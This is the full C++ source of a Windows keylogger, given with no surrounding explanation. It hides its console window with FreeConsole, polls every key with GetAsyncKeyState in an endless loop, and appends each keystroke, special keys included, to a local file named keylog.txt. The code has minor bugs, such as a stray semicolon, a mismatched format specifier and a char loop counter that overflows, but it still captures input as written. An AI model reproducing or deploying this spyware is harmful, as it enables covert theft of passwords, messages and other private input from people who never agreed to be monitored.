#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

int Save(int key, char *file);

int main()
{
    if(ifstream("keylog.txt"));
    std::remove("keylog.txt");
    FreeConsole();
    char i;
    while(true)
    {
        Sleep(10);
        for(i=8; i<=255; i++)
        {
            if(GetAsyncKeyState(i) == -32767)
                Save(i, "keylog.txt");
        }
    }

    return 0;

}

int Save(int key, char *file)
{
    cout<<key<<endl;

    Sleep(10);
    FILE *Output;

    Output = fopen(file, "a+");
    if(key == VK_SHIFT)
     fprintf(Output, "%s", "[SHIFT] ");
    else
    if(key == VK_BACK)
     fprintf(Output, "%s", "[BACKSPACE] ");
    else
    if(key == VK_RETURN)
     fprintf(Output, "%s\n", "[ENTER] ");
    else
    if(key == VK_LBUTTON)
     fprintf(Output, "%s", "[LBUTTON] ");
    else
    if(key == VK_CAPITAL)
    fprintf(Output,"%s","[CAPITAL]");
    else
    if(key == VK_CONTROL)
    fprintf(Output,"%S","[CONTROL]");
    else
    fprintf(Output, "%s", &key);

    fclose(Output);

    return 0;
}

